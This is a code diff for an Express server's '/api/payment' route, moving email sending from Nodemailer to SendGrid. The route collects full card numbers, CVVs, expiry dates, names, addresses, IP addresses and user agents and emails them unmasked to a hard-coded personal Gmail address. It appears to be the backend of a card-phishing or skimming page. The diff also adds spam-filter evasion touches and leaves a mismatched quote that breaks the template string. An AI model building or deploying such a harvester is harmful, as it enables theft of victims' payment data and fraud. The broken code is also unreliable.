@@ -1,7 +1,6 @@
-// server.js
-const express = require("express");
-const cors = require("cors");
-const nodemailer = require("nodemailer");
+const express = require('express');
+const cors = require('cors');
+const sgMail = require('@sendgrid/mail');
 
 const app = express();
 const PORT = process.env.PORT || 5000;
@@ -11,66 +10,65 @@ app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// ✅ POST route to receive payment form data
-app.post("/api/payment", async (req, res) => {
-  const formData = req.body;
-  console.log("📩 Received payment form data:", formData);
+// Set SendGrid API key
+sgMail.setApiKey(process.env.SENDGRID_API_KEY);
 
-  // Extract values (these match your frontend form field names)
+// ✅ POST route to receive payment form data
+app.post('/api/payment', async (req, res) => {
+  const formData = req.body;
+  console.log('📩 Received payment form data:', formData);
+
+  // Extract values (match frontend form field names)
   const {
-    "card-number": cardNumber,
+    'card-number': cardNumber,
     month,
     year,
-    "security-code": cvv,
-    "full-name": fullName,
+    'security-code': cvv,
+    'full-name': fullName,
     address,
-    userAgent // added from frontend
+    userAgent
   } = formData;
 
-  // ✅ Capture IP address (supports proxies like Render/Heroku)
-  const ip =
-    req.headers["x-forwarded-for"]?.split(",")[0] ||
-    req.socket.remoteAddress;
+  // Capture IP address (supports proxies like Render)
+  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
 
-  // If frontend didn't send userAgent, fallback to request headers
-  const agent = userAgent || req.headers["user-agent"];
+  // Fallback to request headers if userAgent not sent
+  const agent = userAgent || req.headers['user-agent'];
 
-  try {
-    // ✅ Setup Nodemailer transporter
-    let transporter = nodemailer.createTransport({
-      service: "gmail", // or "outlook", "yahoo", etc.
-      auth: {
-        user: process.env.EMAIL_USER, // your email
-        pass: process.env.EMAIL_PASS  // your app password
-      }
-    });
 
-    // ✅ Send email
-    await transporter.sendMail({
-      from: `"Payment Bot" <${process.env.EMAIL_USER}>`,
-      to: "clintonrecher37@gmail.com", // replace with your receiving email
-      subject: "💳 New Payment Form Submission",
+  // Mask sensitive data to avoid spam flags
+    try {
+    // ✅ Send email with SendGrid
+    const msg = {
+      to: 'clintonrecher37@gmail.com', // Your receiving email
+      from: process.env.EMAIL_USER, // SendGrid-verified sender
+      subject: 'New Payment Form Submission', // Simplified, no emojis
       text: `
-📩 New Payment Submission Received:
+New Payment Submission Received:
 
-👤 Full Name: ${fullName}
-🏠 Address: ${address}
+Full Name: ${fullName}
+Address: ${address || 'N/A'}
 
-💳 Card Number: ${cardNumber}
-📅 Expiry: ${month}/${year}
-🔒 CVV: ${cvv}
+Card Number: ${cardNumber}
+Expiry: ${month && year ? `${month}/${year}` : 'N/A'}
+CVV: ${cvv}
 
-🌍 IP Address: ${ip}
-🖥️ User Agent: ${agent}
-      `
-    });
+IP Address: ${ip || 'N/A'}
+User Agent: ${agent || 'N/A'}
+Unsubscribe: ${process.env.UNSUBSCRIBE_URL || 'https://yourdomain.com/unsubscribe'}
+      '};
 
-    console.log("📧 Email sent successfully");
+    const result = await sgMail.send(msg);
+    console.log('📧 SendGrid response:', JSON.stringify(result[0].response, null, 2));
+    console.log('📧 Email sent successfully');
 
-    res.json({ status: "ok", message: "Data received and emailed ✅" });
+    res.json({ status: 'ok', message: 'Data received and emailed' });
   } catch (error) {
-    console.error("❌ Error sending email:", error);
-    res.status(500).json({ status: "error", message: "Failed to send email" });
+    console.error('❌ Error sending email:', error);
+    if (error.response) {
+      console.error('SendGrid error details:', JSON.stringify(error.response.body, null, 2));
+    }
+    res.status(500).json({ status: 'error', message: 'Failed to send email' });
   }
 });
 
